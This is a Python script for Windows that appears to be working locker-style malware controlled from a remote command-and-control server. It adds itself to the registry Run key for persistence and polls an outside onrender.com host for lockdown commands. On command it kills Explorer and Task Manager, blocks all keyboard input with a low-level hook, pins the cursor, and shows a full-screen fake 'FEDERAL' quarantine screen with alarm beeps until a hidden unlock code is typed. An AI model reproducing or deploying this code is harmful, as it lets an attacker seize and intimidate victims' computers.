import ctypes
import json
import os
import random
import subprocess
import sys
import threading
import time
import tkinter as tk
import winsound
import winreg
import requests

# 👉 YOUR PERMANENT RENDER C2 SERVER URL
CLOUD_SERVER_URL = "https://test-uukm.onrender.com"

# Global state tracking
lockdown_state = {
    "active": False,
    "reason": "",
    "session_id": "",
    "duration": 900,
}

def make_persistent():
    """Adds the script to Windows Startup Registry to make it reboot-proof"""
    if os.name == "nt":
        try:
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            script_path = os.path.abspath(sys.argv[0])
            python_executable = sys.executable
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "OSGuardC2Daemon", 0, winreg.REG_SZ, f'"{python_executable}" "{script_path}"')
        except Exception as e:
            pass


# Windows Hook Constants for Low-Level Keyboard Interception
WH_KEYBOARD_LL = 13
hook_id = None

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", ctypes.c_ulong),
        ("scanCode", ctypes.c_ulong),
        ("flags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

def low_level_keyboard_proc(nCode, wParam, lParam):
    if nCode >= 0 and lockdown_state["active"]:
        return 1
    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)

CMPFUNC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_void_p))
hook_callback = CMPFUNC(low_level_keyboard_proc)

def install_keyboard_hook():
    global hook_id
    if os.name == "nt" and not hook_id:
        hInstance = ctypes.windll.kernel32.GetModuleHandleW(None)
        hook_id = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook_callback, hInstance, 0)

def remove_keyboard_hook():
    global hook_id
    if os.name == "nt" and hook_id:
        ctypes.windll.user32.UnhookWindowsHookEx(hook_id)
        hook_id = None


class TwoWayChaosTakedown:
    def __init__(self):
        self.root = None
        self.secret_buffer = ""
        self.unlock_code = "unlock500"
        self.attempt_count = 0

    def engage_chaos(self, reason, session_id):
        if lockdown_state["active"] and self.root:
            return  # Prevent multiple windows stacking up

        lockdown_state["active"] = True
        lockdown_state["reason"] = reason
        lockdown_state["session_id"] = session_id

        if os.name == "nt":
            subprocess.run("taskkill /F /IM explorer.exe", shell=True, capture_output=True)
            subprocess.run("taskkill /F /IM Taskmgr.exe", shell=True, capture_output=True)
            subprocess.run("powershell -Command \"(New-Object -ComObject WScript.Shell).SendKeys([char]175)\"", shell=True, capture_output=True)
            install_keyboard_hook()

        self.root = tk.Tk()
        self.root.title("FEDERAL C2 COMMAND CENTER — QUARANTINE")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="#030305")
        self.root.overrideredirect(True)

        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind("<Alt-F4>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")
        self.root.bind("<Control-Shift-Escape>", lambda e: "break")
        self.root.bind("<Key>", self.on_key_press)

        self.frame = tk.Frame(self.root, bg="#0d0d14", highlightbackground="#ff1744", highlightthickness=6, padx=40, pady=40)
        self.frame.place(relx=0.5, rely=0.5, anchor="center")

        tk.Label(self.frame, text="🚨 CLOUD C2 / ENDPOINT QUARANTINE ACTIVE 🚨", fg="#ff1744", bg="#0d0d14", font=("Consolas", 20, "bold")).pack(pady=(0, 10))
        
        info_msg = f"SESSION ID: {session_id}\nReason: {reason}\nConnected to Cloud C2. Awaiting Admin Authorization..."
        tk.Label(self.frame, text=info_msg, fg="#f1f5f9", bg="#0d0d14", font=("Consolas", 12), justify="center").pack(pady=(0, 15))

        self.log_box = tk.Text(self.frame, height=6, width=65, bg="#000000", fg="#00ff66", font=("Consolas", 10), bd=0)
        self.log_box.pack(pady=(0, 15))
        self.log_box.insert(tk.END, f"[*] Secure connection established with Render C2 server.\n[*] Session {session_id} enforced.\n[*] Windows Explorer & Task Manager disabled.\n")
        self.log_box.config(state=tk.DISABLED)

        self.timer_lbl = tk.Label(self.frame, text="15:00", fg="#ffffff", bg="#0d0d14", font=("Consolas", 48, "bold"))
        self.timer_lbl.pack()

        self.attempt_lbl = tk.Label(self.frame, text="SECURITY BYPASS ATTEMPTS BLOCKED: 0", fg="#ffd700", bg="#0d0d14", font=("Consolas", 12, "bold"))
        self.attempt_lbl.pack(pady=(15, 0))

        self.start_time = time.time()
        threading.Thread(target=self.chaos_audio_loop, daemon=True).start()
        threading.Thread(target=self.taskmgr_killer_loop, daemon=True).start()
        self.chaos_visual_loop()
        self.update_countdown_loop()

        self.root.mainloop()

    def on_key_press(self, event):
        if event.char:
            self.secret_buffer = (self.secret_buffer + event.char.lower())[-9:]
            if self.secret_buffer == self.unlock_code:
                self.disarm(lockdown_state["session_id"])
                return "break"

        self.attempt_count += 1
        self.attempt_lbl.config(text=f"SECURITY BYPASS ATTEMPTS BLOCKED: {self.attempt_count}")
        return "break"

    def chaos_visual_loop(self):
        if not lockdown_state["active"] or not self.root:
            return
        try:
            self.root.attributes("-topmost", True)
            self.root.focus_force()
            colors = ["#1a0000", "#00001a", "#0d0d14", "#26000d"]
            self.frame.config(bg=random.choice(colors))
            sw = self.root.winfo_screenwidth()
            sh = self.root.winfo_screenheight()
            if os.name == "nt":
                ctypes.windll.user32.SetCursorPos(sw // 2, sh // 2)
        except Exception:
            pass
        self.root.after(100, self.chaos_visual_loop)

    def taskmgr_killer_loop(self):
        while lockdown_state["active"]:
            if os.name == "nt":
                subprocess.run("taskkill /F /IM Taskmgr.exe", shell=True, capture_output=True)
            time.sleep(0.3)

    def update_countdown_loop(self):
        if not lockdown_state["active"] or not self.root:
            return
        elapsed = int(time.time() - self.start_time)
        remaining = max(0, lockdown_state["duration"] - elapsed)
        m, s = divmod(remaining, 60)
        self.timer_lbl.config(text=f"{m:02d}:{s:02d}")
        if remaining <= 0:
            self.disarm(lockdown_state["session_id"])
        else:
            self.root.after(1000, self.update_countdown_loop)

    def chaos_audio_loop(self):
        while lockdown_state["active"]:
            if os.name == "nt":
                winsound.Beep(1200, 150)
                winsound.Beep(800, 150)
            time.sleep(0.5)

    def disarm(self, session_id):
        lockdown_state["active"] = False
        remove_keyboard_hook()
        
        try:
            requests.get(f"{CLOUD_SERVER_URL}/api/lift-quarantine?session_id={session_id}", timeout=3)
        except Exception:
            pass

        if os.name == "nt":
            subprocess.Popen("explorer.exe", shell=True)
        if self.root:
            try:
                self.root.destroy()
            except Exception:
                pass
            self.root = None


def cloud_polling_daemon(guard):
    """Background thread that polls the Render C2 server every 2 seconds"""
    while True:
        try:
            print("[*] Polling Render C2 server for commands...")
            response = requests.get(f"{CLOUD_SERVER_URL}/api/sessions", timeout=5)
            if response.status_code == 200:
                sessions = response.json()
                print(f"[+] Connected! Active sessions found: {len(sessions)}")
                for session in sessions:
                    if session['status'] == 'ACTIVE' and not lockdown_state["active"]:
                        print(f"🚨 LOCKDOWN COMMAND RECEIVED! Session ID: {session['session_id']}")
                        if guard.root:
                            guard.root.after(0, lambda r=session['reason'], s=session['session_id']: guard.engage_chaos(r, s))
                        else:
                            threading.Thread(target=lambda r=session['reason'], s=session['session_id']: guard.engage_chaos(r, s), daemon=True).start()

                    elif session['status'] == 'DISARMED' and lockdown_state["active"] and lockdown_state["session_id"] == session['session_id']:
                        print(f"✅ DISARM COMMAND RECEIVED for {session['session_id']}")
                        if guard.root:
                            guard.root.after(0, lambda s=session['session_id']: guard.disarm(s))
        except Exception as e:
            print(f"[-] Polling error (Render might be spinning up): {e}")
        
        time.sleep(2)


if __name__ == "__main__":
    # 1. Register persistence in Windows Startup Registry
    make_persistent()

    # 2. Instantiate Guard handler
    guard = TwoWayChaosTakedown()

    # 3. Start cloud polling daemon in the background thread
    threading.Thread(target=cloud_polling_daemon, args=(guard,), daemon=True).start()

    # 4. Main loop checks-in or starts idle loop to catch events
    while True:
        if lockdown_state["active"] and not guard.root:
            guard.engage_chaos(lockdown_state["reason"], lockdown_state["session_id"])
        time.sleep(0.5)
